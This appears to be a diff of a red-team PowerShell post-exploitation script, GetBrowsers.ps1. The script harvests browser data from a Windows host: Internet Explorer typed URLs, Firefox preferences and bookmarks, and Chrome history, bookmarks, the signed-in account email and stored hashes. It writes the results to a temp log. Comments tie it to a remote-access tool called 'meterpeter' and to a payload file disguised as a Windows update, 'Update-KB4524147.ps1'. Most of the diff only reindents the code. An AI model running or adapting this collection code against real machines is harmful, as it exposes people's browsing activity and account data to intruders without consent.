@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  Standalone Powershell script that will dump Local-Host browsers information.
+  Standalone Powershell script that will dump Installed browsers information.
 
 .Author r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
@@ -8,9 +8,9 @@
   PS Script Dev Version: v1.10
 
 .DESCRIPTION
-   Standalone Powershell script to dump Local-host browser information sutch as: HomePage, Browser Version
-   Language, Download Directory, URL History, Bookmarks, extentions, etc.. The dumps will be Saved into 
-   $env:TMP Folder. Unless this script 2º argument its used to input another LogFile storage location.
+   Standalone Powershell script to dump Installed browsers information sutch as: HomePage, Browser Version
+   Language, Download Directory, URL History, Bookmarks, Extentions, etc.. The dumps will be Saved into 
+   $env:TMP Folder. Unless this script 2º argument its used to input another Logfile storage location.
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -RECON
@@ -38,7 +38,6 @@
 #>
 
 
-$IPATH = pwd
 $Path = $null
 $mpset = $False
 $param1 = $args[0] # User Inputs [Arguments]
@@ -61,11 +60,11 @@ If(-not($param1)){
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and saves logfile to TEMP.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
-    ## For those who insiste in running this script outside meterpeter
-    If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
-        Start-Sleep -Seconds 10
-    }
-    exit
+        ## For those who insiste in running this script outside meterpeter
+        If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
+            Start-Sleep -Seconds 10
+        }
+    Exit
 }else{
     echo "`n" > $LogFilePath\BrowserEnum.log
 }
@@ -88,19 +87,20 @@ $MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";
 ## Get System UserAgent string
 $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object 'User Agent'
 If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''}else{$ParsingIntSet = "UserAgent    : Not Found"}
+
 ## Writting LogFile to the selected path in: { $param2 var }
 echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
 echo "---------------" >> $LogFilePath\BrowserEnum.log
 echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
-echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log 
-## Get Flash Internal Name/Version
-If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
-    echo "flashName    : Not Found" >> $LogFilePath\BrowserEnum.log
-}else{
-    $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
-    $flashName = $flash.versioninfo.InternalName
-    echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
-}
+echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log
+    ## Get Flash Internal Name/Version
+    If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
+        echo "flashName    : Not Found" >> $LogFilePath\BrowserEnum.log
+    }else{
+        $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
+        $flashName = $flash.versioninfo.InternalName
+        echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
+    }
 echo "$MInvocation" >> $LogFilePath\BrowserEnum.log
 
 
@@ -120,14 +120,14 @@ function BROWSER_RECON {
     If($IEVersion){$IEfound = "Found"}else{$IEfound = "False";$IEVersion = "            "}
     $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -ErrorAction SilentlyContinue).version
     If($Chrome_App){$CHfound = "Found"}else{$CHfound = "False";$Chrome_App = "  "}
-    If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles")){
-        $FFfound = "False";$ParsingData = "  "
-    }else{
-        $FFfound = "Found"
-        $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
-        $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
-        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
-    }
+        If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles")){
+            $FFfound = "False";$ParsingData = "  "
+        }else{
+            $FFfound = "Found"
+            $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
+            $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
+            $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
+        }
     ## Build Table to display results found
     echo "`n`nBrowser      Status      Version         PreDefined" > $LogFilePath\BrowserEnum.log
     echo "-------      ------      -------         ----------" >> $LogFilePath\BrowserEnum.log
@@ -142,40 +142,41 @@ function IE_Dump {
     echo "`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
     echo "----------" >> $LogFilePath\BrowserEnum.log
     $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
-    If(-not($IEVersion) -or $IEVersion -eq $null){
-        echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
-        $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
-        $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
-        $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
-        $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
-        $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
-        $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
-        $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
-        $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
-        $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
-        $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
-        $IETestings = (Get-Process MicrosoftEdge -ErrorAction SilentlyContinue).Responding
-        If($IETestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
-        ## Writting LogFile to the selected path in: { $param2 var }
-        echo "$Status" >> $LogFilePath\BrowserEnum.log
-        echo "$KBData" >> $LogFilePath\BrowserEnum.log
-        echo "$IEData" >> $LogFilePath\BrowserEnum.log
-        echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
-        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
-        echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
-    }
+        If(-not($IEVersion) -or $IEVersion -eq $null){
+            echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
+            $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
+            $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
+            $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
+            $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
+            $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
+            $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
+            $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
+            $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
+            $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
+            $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
+            $IETestings = (Get-Process MicrosoftEdge -ErrorAction SilentlyContinue).Responding
+            If($IETestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
+
+            ## Writting LogFile to the selected path in: { $param2 var }
+            echo "$Status" >> $LogFilePath\BrowserEnum.log
+            echo "$KBData" >> $LogFilePath\BrowserEnum.log
+            echo "$IEData" >> $LogFilePath\BrowserEnum.log
+            echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
+            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
+            echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
+        }
 
     ## Retrieve IE history URLs
     echo "`nIE History" >> $LogFilePath\BrowserEnum.log
     echo "----------" >> $LogFilePath\BrowserEnum.log
     $IEHistory = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue|findstr /B /I "url"
-    If(-not($IEHistory) -or $IEHistory -eq $null){
-        echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
-    }
+        If(-not($IEHistory) -or $IEHistory -eq $null){
+            echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
+        }
 
     ## Retrieve IE Bookmarks
     # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
@@ -263,16 +264,16 @@ function FIREFOX {
     ## TODO: Retrieve FireFox bookmarks
     echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "-----------------" >> $LogFilePath\BrowserEnum.log
-    $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4-" # delete last - from var
-    If(-not(Test-Path -Path "$Bookmarks_Path")) {
-        echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
-        # primitive JSON invalid error parsing json to text|csv ....{ |ConvertFrom-String }
-        $Json = Get-Content $Bookmarks_Path >> $LogFilePath\BrowserEnum.log
-        # foreach ($Bookmarks_Path in $Bookmarks_Path.children){
-        #     Search-FxBookmarks -Bookmarks $Bookmarks_Path -PathSoFar $NewPath -SearchString $SearchString >> $LogFilePath\BrowserEnum.log
-        #}
+    $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4-" # delete last - from Path
+        If(-not(Test-Path -Path "$Bookmarks_Path")) {
+            echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
+            # primitive JSON invalid error parsing json to text|csv ....{ |ConvertFrom-String }
+            $Json = Get-Content $Bookmarks_Path >> $LogFilePath\BrowserEnum.log
+            # foreach ($Bookmarks_Path in $Bookmarks_Path.children){
+            #     Search-FxBookmarks -Bookmarks $Bookmarks_Path -PathSoFar $NewPath -SearchString $SearchString >> $LogFilePath\BrowserEnum.log
+            #}
     }
 }
 
@@ -282,41 +283,41 @@ function CHROME {
     echo "`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
     echo "--------------" >> $LogFilePath\BrowserEnum.log
     $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
-    If(-not($Chrome_App) -or $Chrome_App -eq $null){
-        echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        ## Test if browser its active 
-        $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-        $CHTestings = (Get-Process Chrome -ErrorAction SilentlyContinue).Responding
-        If($CHTestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
-        echo "$Status" >> $LogFilePath\BrowserEnum.log
-
-        ## Retrieve Download Pref Settings
-        $Parse_String = $Preferencies_Path.split(",")
-        $Search_Download = $Parse_String|select-string "download"
-        $Store_Dump = $Search_Download[1] # download_history Property
-        $Parse_Dump = $Store_Dump -replace '"','' -replace ':','      : ' -replace 'download_history','History'
-        echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
-
-        ## Retrieve Browser accept languages
-        $Parse_String = $Preferencies_Path.split(",")
-        $Search_Lang = $Parse_String|select-string "accept_languages"
-        $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':','    : ' -replace 'accept_languages','Languages'
-        echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
-
-        ## Retrieve Browser Version
-        $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
-        echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
-
-        ## Retrieve Email from Google CHROME preferencies File ..
-        $Parse_String = $Preferencies_Path.split(",")
-        $Search_Email = $Parse_String|select-string "email"
-        $Parse_Dump = $Search_Email -replace ' ','' -replace '"','' -replace ':','        : '
-        If(-not($Search_Email) -or $Search_Email -eq $null){
-            echo "Email            : None Email Found .." >> $LogFilePath\BrowserEnum.log
+        If(-not($Chrome_App) -or $Chrome_App -eq $null){
+            echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
         }else{
+            ## Test if browser its active 
+            $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+            $CHTestings = (Get-Process Chrome -ErrorAction SilentlyContinue).Responding
+            If($CHTestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
+            echo "$Status" >> $LogFilePath\BrowserEnum.log
+
+            ## Retrieve Download Pref Settings
+            $Parse_String = $Preferencies_Path.split(",")
+            $Search_Download = $Parse_String|select-string "download"
+            $Store_Dump = $Search_Download[1] # download_history Property
+            $Parse_Dump = $Store_Dump -replace '"','' -replace ':','      : ' -replace 'download_history','History'
             echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
-        }
+
+            ## Retrieve Browser accept languages
+            $Parse_String = $Preferencies_Path.split(",")
+            $Search_Lang = $Parse_String|select-string "accept_languages"
+            $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':','    : ' -replace 'accept_languages','Languages'
+            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
+
+            ## Retrieve Browser Version
+            $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
+            echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
+
+            ## Retrieve Email from Google CHROME preferencies File ..
+            $Parse_String = $Preferencies_Path.split(",")
+            $Search_Email = $Parse_String|select-string "email"
+            $Parse_Dump = $Search_Email -replace ' ','' -replace '"','' -replace ':','        : '
+                If(-not($Search_Email) -or $Search_Email -eq $null){
+                    echo "Email            : None Email Found .." >> $LogFilePath\BrowserEnum.log
+                }else{
+                    echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
+                }
     }
 
     ## Retrieve Chrome History
@@ -324,49 +325,49 @@ function CHROME {
     echo "`nChrome History" >> $LogFilePath\BrowserEnum.log
     echo "--------------" >> $LogFilePath\BrowserEnum.log
     $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-    If(-not(Test-Path -Path $History_Path)){
-        echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-        $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-        $Get_Values | ForEach-Object {
-            $Key = $_
-            if ($Key -match $Search){
-                echo "$_" >> $LogFilePath\BrowserEnum.log
+        If(-not(Test-Path -Path $History_Path)){
+            echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+            $Get_Values | ForEach-Object {
+                $Key = $_
+                if ($Key -match $Search){
+                    echo "$_" >> $LogFilePath\BrowserEnum.log
+                }
             }
         }
-    }
 
     ## Retrieve Chrome bookmarks
     echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "----------------" >> $LogFilePath\BrowserEnum.log
     $Bookmarks_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-    If(-not(Test-Path -Path $Bookmarks_Path)) {
-        echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        $Json = Get-Content $Bookmarks_Path
-        $Output = ConvertFrom-Json20($Json)
-        $Jsonobject = $Output.roots.bookmark_bar.children
-        $Jsonobject.url |Sort -Unique | ForEach-Object {
-            if ($_ -match $Search) {
-                echo "$_" >> $LogFilePath\BrowserEnum.log
+        If(-not(Test-Path -Path $Bookmarks_Path)) {
+            echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Json = Get-Content $Bookmarks_Path
+            $Output = ConvertFrom-Json20($Json)
+            $Jsonobject = $Output.roots.bookmark_bar.children
+            $Jsonobject.url |Sort -Unique | ForEach-Object {
+                if ($_ -match $Search) {
+                    echo "$_" >> $LogFilePath\BrowserEnum.log
+                }
             }
         }
-    }
 
     ## Retrieve Chrome Cookies (hashs)
     echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
     echo "--------------" >> $LogFilePath\BrowserEnum.log
     $Cookie_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-    If(-not(Test-Path -Path $Cookie_Path)){
-        echo "Could not find any Cookies .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-        $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
-        $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
-        $Dump_Key_Hash = $BadChars|where-object {$_}
-        echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
-    }
+        If(-not(Test-Path -Path $Cookie_Path)){
+            echo "Could not find any Cookies .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+            $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
+            $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
+            $Dump_Key_Hash = $BadChars|where-object {$_}
+            echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
+        }
 }
 
 
@@ -399,4 +400,4 @@ If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}
 ## Retrieve Remote Info from LogFile
 Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
 If($mpset -eq $False){Remove-Item $LogFilePath\BrowserEnum.log -Force}
-exit
+Exit
